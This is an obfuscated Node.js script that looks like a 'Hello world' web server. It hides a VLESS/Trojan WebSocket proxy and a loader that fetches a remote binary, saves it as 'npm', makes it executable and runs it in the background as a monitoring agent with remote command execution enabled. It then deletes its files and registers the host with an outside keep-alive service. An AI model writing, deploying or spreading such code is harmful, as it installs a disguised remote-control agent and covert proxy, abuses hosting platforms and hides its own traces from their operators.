const _0x41001c=_0x4f37;(function(_0x8dce3,_0x3204a9){const _0x2ed4a4=_0x4f37,_0x46d9e2=_0x8dce3();while(!![]){try{const _0x12d171=-parseInt(_0x2ed4a4(0x20a))/0x1+parseInt(_0x2ed4a4(0x200))/0x2+parseInt(_0x2ed4a4(0x206))/0x3+parseInt(_0x2ed4a4(0x21f))/0x4*(-parseInt(_0x2ed4a4(0x22d))/0x5)+-parseInt(_0x2ed4a4(0x247))/0x6*(-parseInt(_0x2ed4a4(0x23c))/0x7)+-parseInt(_0x2ed4a4(0x241))/0x8*(-parseInt(_0x2ed4a4(0x25b))/0x9)+parseInt(_0x2ed4a4(0x24b))/0xa*(-parseInt(_0x2ed4a4(0x1f1))/0xb);if(_0x12d171===_0x3204a9)break;else _0x46d9e2['push'](_0x46d9e2['shift']());}catch(_0x2ed42e){_0x46d9e2['push'](_0x46d9e2['shift']());}}}(_0x24e2,0x2268c));const os=require('os'),http=require(_0x41001c(0x255)),fs=require('fs'),axios=require(_0x41001c(0x250)),net=require(_0x41001c(0x1f6)),path=require(_0x41001c(0x216)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x41001c(0x211)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x41001c(0x1f3)]||_0x41001c(0x248),NEZHA_SERVER=process[_0x41001c(0x23b)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x41001c(0x23b)][_0x41001c(0x1e1)]||'',NEZHA_KEY=process[_0x41001c(0x23b)][_0x41001c(0x225)]||'',DOMAIN=process['env'][_0x41001c(0x1f0)]||_0x41001c(0x23d),AUTO_ACCESS=process[_0x41001c(0x23b)][_0x41001c(0x218)]||!![],WSPATH=process[_0x41001c(0x23b)][_0x41001c(0x231)]||UUID[_0x41001c(0x1ec)](0x0,0x8),SUB_PATH=process[_0x41001c(0x23b)]['SUB_PATH']||_0x41001c(0x22a),NAME=process[_0x41001c(0x23b)][_0x41001c(0x202)]||_0x41001c(0x1f4),PORT=process[_0x41001c(0x23b)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x24c9d8=_0x41001c;try{const _0x3772b0=await axios['get'](_0x24c9d8(0x25a)),_0x18c58f=_0x3772b0[_0x24c9d8(0x227)];ISP=(_0x18c58f[_0x24c9d8(0x1ea)]+'-'+_0x18c58f[_0x24c9d8(0x201)])[_0x24c9d8(0x257)](/ /g,'_');}catch(_0x26a8ed){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x1de5d6,_0x5d2ad9)=>{const _0x29288c=_0x41001c;if(_0x1de5d6[_0x29288c(0x24f)]==='/'){const _0x2eec0c=path[_0x29288c(0x1fd)](__dirname,'index.html');fs[_0x29288c(0x1e8)](_0x2eec0c,'utf8',(_0x2527b6,_0x37cd24)=>{const _0x172e67=_0x29288c;if(_0x2527b6){_0x5d2ad9['writeHead'](0xc8,{'Content-Type':_0x172e67(0x235)}),_0x5d2ad9[_0x172e67(0x234)](_0x172e67(0x228));return;}_0x5d2ad9['writeHead'](0xc8,{'Content-Type':_0x172e67(0x235)}),_0x5d2ad9[_0x172e67(0x234)](_0x37cd24);});return;}else{if(_0x1de5d6[_0x29288c(0x24f)]==='/'+SUB_PATH){const _0x4e87a6='vless://'+UUID+'@'+DOMAIN+_0x29288c(0x21c)+DOMAIN+_0x29288c(0x1f2)+DOMAIN+_0x29288c(0x259)+WSPATH+'#'+NAME+'-'+ISP,_0x17baa=_0x29288c(0x1e0)+UUID+'@'+DOMAIN+_0x29288c(0x1f8)+DOMAIN+_0x29288c(0x1f2)+DOMAIN+_0x29288c(0x259)+WSPATH+'#'+NAME+'-'+ISP,_0x718cc3=_0x4e87a6+'\x0a'+_0x17baa,_0x5c1c71=Buffer['from'](_0x718cc3)['toString'](_0x29288c(0x256));_0x5d2ad9[_0x29288c(0x223)](0xc8,{'Content-Type':_0x29288c(0x238)}),_0x5d2ad9[_0x29288c(0x234)](_0x5c1c71+'\x0a');}else _0x5d2ad9[_0x29288c(0x223)](0x194,{'Content-Type':_0x29288c(0x238)}),_0x5d2ad9[_0x29288c(0x234)]('Not\x20Found\x0a');}}),_0x47b56d={'server':httpServer},wss=new WebSocket[(_0x41001c(0x207))](_0x47b56d),uuid=UUID[_0x41001c(0x257)](/-/g,''),DNS_SERVERS=[_0x41001c(0x254),_0x41001c(0x1ee)];function resolveHost(_0x1490f0){return new Promise((_0x5756b0,_0x9b8719)=>{const _0x4f74d2=_0x4f37;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4f74d2(0x258)](_0x1490f0)){_0x5756b0(_0x1490f0);return;}let _0x5f485d=0x0;function _0x2b0793(){const _0x1c4d5c=_0x4f74d2;if(_0x5f485d>=DNS_SERVERS[_0x1c4d5c(0x1fb)]){_0x9b8719(new Error(_0x1c4d5c(0x252)+_0x1490f0+_0x1c4d5c(0x23f)));return;}const _0x1b6f00=DNS_SERVERS[_0x5f485d];_0x5f485d++;const _0x2a40fc=_0x1c4d5c(0x24a)+encodeURIComponent(_0x1490f0)+_0x1c4d5c(0x20d);axios[_0x1c4d5c(0x204)](_0x2a40fc,{'timeout':0x1388,'headers':{'Accept':_0x1c4d5c(0x236)}})[_0x1c4d5c(0x220)](_0x14cd96=>{const _0x392631=_0x1c4d5c,_0xf95cda=_0x14cd96[_0x392631(0x227)];if(_0xf95cda[_0x392631(0x23e)]===0x0&&_0xf95cda['Answer']&&_0xf95cda[_0x392631(0x214)][_0x392631(0x1fb)]>0x0){const _0x129702=_0xf95cda[_0x392631(0x214)][_0x392631(0x246)](_0x522817=>_0x522817[_0x392631(0x232)]===0x1);if(_0x129702){_0x5756b0(_0x129702[_0x392631(0x227)]);return;}}_0x2b0793();})[_0x1c4d5c(0x1ff)](_0x7c88a5=>{_0x2b0793();});}_0x2b0793();});}function handleVlessConnection(_0x26ba4c,_0x4a7cf8){const _0x5096fd=_0x41001c,[_0x1f4d09]=_0x4a7cf8,_0x41aeaa=_0x4a7cf8[_0x5096fd(0x1ec)](0x1,0x11);if(!_0x41aeaa[_0x5096fd(0x1e6)]((_0x10986f,_0x54b21e)=>_0x10986f==parseInt(uuid[_0x5096fd(0x1fc)](_0x54b21e*0x2,0x2),0x10)))return![];let _0x5bc236=_0x4a7cf8[_0x5096fd(0x1ec)](0x11,0x12)[_0x5096fd(0x230)]()+0x13;const _0x4c26b3=_0x4a7cf8[_0x5096fd(0x1ec)](_0x5bc236,_0x5bc236+=0x2)[_0x5096fd(0x1df)](0x0),_0x189cf7=_0x4a7cf8[_0x5096fd(0x1ec)](_0x5bc236,_0x5bc236+=0x1)['readUInt8'](),_0x12be61=_0x189cf7==0x1?_0x4a7cf8[_0x5096fd(0x1ec)](_0x5bc236,_0x5bc236+=0x4)[_0x5096fd(0x1fd)]('.'):_0x189cf7==0x2?new TextDecoder()[_0x5096fd(0x21b)](_0x4a7cf8[_0x5096fd(0x1ec)](_0x5bc236+0x1,_0x5bc236+=0x1+_0x4a7cf8[_0x5096fd(0x1ec)](_0x5bc236,_0x5bc236+0x1)['readUInt8']())):_0x189cf7==0x3?_0x4a7cf8[_0x5096fd(0x1ec)](_0x5bc236,_0x5bc236+=0x10)['reduce']((_0x100c28,_0x2abe49,_0x14a1c6,_0x2b4b2f)=>_0x14a1c6%0x2?_0x100c28[_0x5096fd(0x239)](_0x2b4b2f['slice'](_0x14a1c6-0x1,_0x14a1c6+0x1)):_0x100c28,[])[_0x5096fd(0x22c)](_0x57912b=>_0x57912b[_0x5096fd(0x1df)](0x0)['toString'](0x10))[_0x5096fd(0x1fd)](':'):'';_0x26ba4c['send'](new Uint8Array([_0x1f4d09,0x0]));const _0x30aabd=createWebSocketStream(_0x26ba4c);return resolveHost(_0x12be61)[_0x5096fd(0x220)](_0x57c50d=>{const _0x10adc1=_0x5096fd,_0x555ded={'host':_0x57c50d,'port':_0x4c26b3};net['connect'](_0x555ded,function(){const _0x1b8d95=_0x4f37;this[_0x1b8d95(0x205)](_0x4a7cf8[_0x1b8d95(0x1ec)](_0x5bc236)),_0x30aabd['on'](_0x1b8d95(0x1fa),()=>{})[_0x1b8d95(0x20f)](this)['on']('error',()=>{})[_0x1b8d95(0x20f)](_0x30aabd);})['on'](_0x10adc1(0x1fa),()=>{});})[_0x5096fd(0x1ff)](_0x106b16=>{const _0x4f24fb=_0x5096fd,_0x4cdd8e={'host':_0x12be61,'port':_0x4c26b3};net[_0x4f24fb(0x24e)](_0x4cdd8e,function(){const _0x2f5436=_0x4f24fb;this['write'](_0x4a7cf8[_0x2f5436(0x1ec)](_0x5bc236)),_0x30aabd['on'](_0x2f5436(0x1fa),()=>{})['pipe'](this)['on'](_0x2f5436(0x1fa),()=>{})['pipe'](_0x30aabd);})['on'](_0x4f24fb(0x1fa),()=>{});}),!![];}function _0x24e2(){const _0x1ea695=['application/dns-json','https://arm64.ssss.nyc.mn/v1','text/plain','concat','update','env','1840286NrQoyK','1234.abc.com','Status','\x20with\x20all\x20DNS\x20servers','pop','1975240XcoLpv','arm','sha224','digest','2087','find','6jKgOTP','c2ba8766-c7e0-46f0-854a-d41e3ef37572','setsid\x20nohup\x20./npm\x20-s\x20','https://dns.google/resolve?name=','2824930avOoPW','log','https://arm64.ssss.nyc.mn/agent','connect','url','axios','trim','Failed\x20to\x20resolve\x20','hex','8.8.4.4','http','base64','replace','test','&path=%2F','https://speed.cloudflare.com/meta','9ARVWVk','readUInt16BE','trojan://','NEZHA_PORT','/bin/bash','npm\x20running\x20error:','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','connection','every','aarch64','readFile','2083','country','post','slice','https://amd64.ssss.nyc.mn/agent','1.1.1.1','createHash','DOMAIN','11egARFg','&fp=chrome&type=ws&host=','UUID','Hug','utf-8','net','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running',':443?security=tls&sni=','unlink','error','length','substr','join','message','catch','285862UGyylh','asOrganization','NAME','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','get','write','751545eAxahn','Server','--tls','application/json','234040IwPLPo','split','listen','&type=A','arch','pipe','chmod\x20+x\x20npm','child_process','close','8443','Answer','false','path','npm\x20is\x20already\x20running,\x20skip\x20running...','AUTO_ACCESS','client_secret:\x20','https://','decode',':443?encryption=none&security=tls&sni=','\x20-p\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','491552FCorOC','then','true','https://oooo.serv00.net/add-url','writeHead','toString','NEZHA_KEY','createWriteStream','data','Hello\x20world!','config.yaml','chenjingxiu','npm','map','10AVwpPF','npm\x20is\x20running','2053','readUInt8','WSPATH','type','includes','end','text/html'];_0x24e2=function(){return _0x1ea695;};return _0x24e2();}function handleTrojanConnection(_0x240ca1,_0x5782ed){const _0x34538b=_0x41001c;try{if(_0x5782ed['length']<0x3a)return![];const _0xe8a7f2=_0x5782ed[_0x34538b(0x1ec)](0x0,0x38)['toString'](),_0x2db2b9=[UUID];let _0x1d921b=null;for(const _0x5045c3 of _0x2db2b9){const _0x1f043d=crypto[_0x34538b(0x1ef)](_0x34538b(0x243))[_0x34538b(0x23a)](_0x5045c3)[_0x34538b(0x244)](_0x34538b(0x253));if(_0x1f043d===_0xe8a7f2){_0x1d921b=_0x5045c3;break;}}if(!_0x1d921b)return![];let _0x27fada=0x38;_0x5782ed[_0x27fada]===0xd&&_0x5782ed[_0x27fada+0x1]===0xa&&(_0x27fada+=0x2);const _0x7b3995=_0x5782ed[_0x27fada];if(_0x7b3995!==0x1)return![];_0x27fada+=0x1;const _0x13da7c=_0x5782ed[_0x27fada];_0x27fada+=0x1;let _0x17695e,_0x1738ee;if(_0x13da7c===0x1)_0x17695e=_0x5782ed[_0x34538b(0x1ec)](_0x27fada,_0x27fada+0x4)['join']('.'),_0x27fada+=0x4;else{if(_0x13da7c===0x3){const _0x29a49e=_0x5782ed[_0x27fada];_0x27fada+=0x1,_0x17695e=_0x5782ed[_0x34538b(0x1ec)](_0x27fada,_0x27fada+_0x29a49e)[_0x34538b(0x224)](),_0x27fada+=_0x29a49e;}else{if(_0x13da7c===0x4)_0x17695e=_0x5782ed[_0x34538b(0x1ec)](_0x27fada,_0x27fada+0x10)['reduce']((_0x40648b,_0xe997df,_0x51263f,_0xdd444)=>_0x51263f%0x2?_0x40648b[_0x34538b(0x239)](_0xdd444['slice'](_0x51263f-0x1,_0x51263f+0x1)):_0x40648b,[])[_0x34538b(0x22c)](_0x2194e7=>_0x2194e7[_0x34538b(0x1df)](0x0)[_0x34538b(0x224)](0x10))['join'](':'),_0x27fada+=0x10;else return![];}}_0x1738ee=_0x5782ed[_0x34538b(0x1df)](_0x27fada),_0x27fada+=0x2;_0x27fada<_0x5782ed[_0x34538b(0x1fb)]&&_0x5782ed[_0x27fada]===0xd&&_0x5782ed[_0x27fada+0x1]===0xa&&(_0x27fada+=0x2);const _0x1404b1=createWebSocketStream(_0x240ca1);return resolveHost(_0x17695e)['then'](_0xb25361=>{const _0x19648d=_0x34538b,_0x17446c={'host':_0xb25361,'port':_0x1738ee};net[_0x19648d(0x24e)](_0x17446c,function(){const _0x3ec887=_0x19648d;_0x27fada<_0x5782ed[_0x3ec887(0x1fb)]&&this[_0x3ec887(0x205)](_0x5782ed[_0x3ec887(0x1ec)](_0x27fada)),_0x1404b1['on'](_0x3ec887(0x1fa),()=>{})[_0x3ec887(0x20f)](this)['on'](_0x3ec887(0x1fa),()=>{})[_0x3ec887(0x20f)](_0x1404b1);})['on'](_0x19648d(0x1fa),()=>{});})[_0x34538b(0x1ff)](_0x45e7d5=>{const _0x4135c0=_0x34538b,_0x49f8d2={'host':_0x17695e,'port':_0x1738ee};net[_0x4135c0(0x24e)](_0x49f8d2,function(){const _0x194809=_0x4135c0;_0x27fada<_0x5782ed[_0x194809(0x1fb)]&&this['write'](_0x5782ed['slice'](_0x27fada)),_0x1404b1['on'](_0x194809(0x1fa),()=>{})[_0x194809(0x20f)](this)['on']('error',()=>{})['pipe'](_0x1404b1);})['on']('error',()=>{});}),!![];}catch(_0x328e19){return![];}}wss['on'](_0x41001c(0x1e5),(_0x42d69f,_0x21ad2e)=>{const _0x4a3864=_0x41001c,_0x22ace0=_0x21ad2e[_0x4a3864(0x24f)]||'';_0x42d69f['once'](_0x4a3864(0x1fe),_0x11aaa0=>{const _0x23928d=_0x4a3864;if(_0x11aaa0[_0x23928d(0x1fb)]>0x11&&_0x11aaa0[0x0]===0x0){const _0x2a774c=_0x11aaa0[_0x23928d(0x1ec)](0x1,0x11),_0x3dc1c5=_0x2a774c[_0x23928d(0x1e6)]((_0x4c1209,_0xa64541)=>_0x4c1209==parseInt(uuid[_0x23928d(0x1fc)](_0xa64541*0x2,0x2),0x10));if(_0x3dc1c5){!handleVlessConnection(_0x42d69f,_0x11aaa0)&&_0x42d69f['close']();return;}}!handleTrojanConnection(_0x42d69f,_0x11aaa0)&&_0x42d69f[_0x23928d(0x212)]();})['on'](_0x4a3864(0x1fa),()=>{});});const getDownloadUrl=()=>{const _0x3aad40=_0x41001c,_0x1c022b=os[_0x3aad40(0x20e)]();if(_0x1c022b===_0x3aad40(0x242)||_0x1c022b==='arm64'||_0x1c022b===_0x3aad40(0x1e7))return!NEZHA_PORT?_0x3aad40(0x237):_0x3aad40(0x24d);else return!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3aad40(0x1ed);},downloadFile=async()=>{const _0x38838e=_0x41001c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3b2d51=getDownloadUrl(),_0xeae1aa=await axios({'method':'get','url':_0x3b2d51,'responseType':'stream'}),_0x5c63df=fs[_0x38838e(0x226)](_0x38838e(0x22b));return _0xeae1aa[_0x38838e(0x227)][_0x38838e(0x20f)](_0x5c63df),new Promise((_0x14326d,_0x3467a0)=>{_0x5c63df['on']('finish',()=>{const _0x2c141e=_0x4f37;console['log']('npm\x20download\x20successfully'),exec(_0x2c141e(0x210),_0x2d0ea3=>{_0x2d0ea3&&_0x3467a0(_0x2d0ea3),_0x14326d();});}),_0x5c63df['on']('error',_0x3467a0);});}catch(_0x44b0d2){throw _0x44b0d2;}},runnz=async()=>{const _0x3a012f=_0x41001c;try{const _0x39bf43=execSync(_0x3a012f(0x1e4),{'encoding':_0x3a012f(0x1f5)});if(_0x39bf43[_0x3a012f(0x251)]()!==''){console[_0x3a012f(0x24c)](_0x3a012f(0x217));return;}}catch(_0x41525a){}await downloadFile();let _0x29dbec='',_0x3b8f39=['443',_0x3a012f(0x213),'2096',_0x3a012f(0x245),_0x3a012f(0x1e9),_0x3a012f(0x22f)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2881ef=_0x3b8f39[_0x3a012f(0x233)](NEZHA_PORT)?_0x3a012f(0x208):'';_0x29dbec=_0x3a012f(0x249)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3a012f(0x21d)+NEZHA_KEY+'\x20'+_0x2881ef+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27bc72=NEZHA_SERVER[_0x3a012f(0x233)](':')?NEZHA_SERVER[_0x3a012f(0x20b)](':')[_0x3a012f(0x240)]():'',_0x3a50ff=_0x3b8f39[_0x3a012f(0x233)](_0x27bc72)?_0x3a012f(0x221):_0x3a012f(0x215),_0x72aa44=_0x3a012f(0x219)+NEZHA_KEY+_0x3a012f(0x21e)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3a50ff+_0x3a012f(0x203)+UUID;fs['writeFileSync'](_0x3a012f(0x229),_0x72aa44);}_0x29dbec='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x3a012f(0x1f7));return;}}try{exec(_0x29dbec,{'shell':_0x3a012f(0x1e2)},_0x16272e=>{const _0x27c48a=_0x3a012f;_0x16272e?console[_0x27c48a(0x1fa)](_0x27c48a(0x1e3),_0x16272e):console['log'](_0x27c48a(0x22e));});}catch(_0x5b0c6b){console['error']('error:\x20'+_0x5b0c6b);}};async function addAccessTask(){const _0x304f38=_0x41001c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xa4056=_0x304f38(0x21a)+DOMAIN;try{const _0x434c0c={'url':_0xa4056},_0x56576c=await axios[_0x304f38(0x1eb)](_0x304f38(0x222),_0x434c0c,{'headers':{'Content-Type':_0x304f38(0x209)}});console[_0x304f38(0x24c)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x176881){}}const delFiles=()=>{const _0x71f36d=_0x41001c;fs[_0x71f36d(0x1f9)](_0x71f36d(0x22b),()=>{}),fs[_0x71f36d(0x1f9)]('config.yaml',()=>{});};function _0x4f37(_0x2ae019,_0x2dd337){_0x2ae019=_0x2ae019-0x1df;const _0x24e2f8=_0x24e2();let _0x4f37ba=_0x24e2f8[_0x2ae019];return _0x4f37ba;}httpServer[_0x41001c(0x20c)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
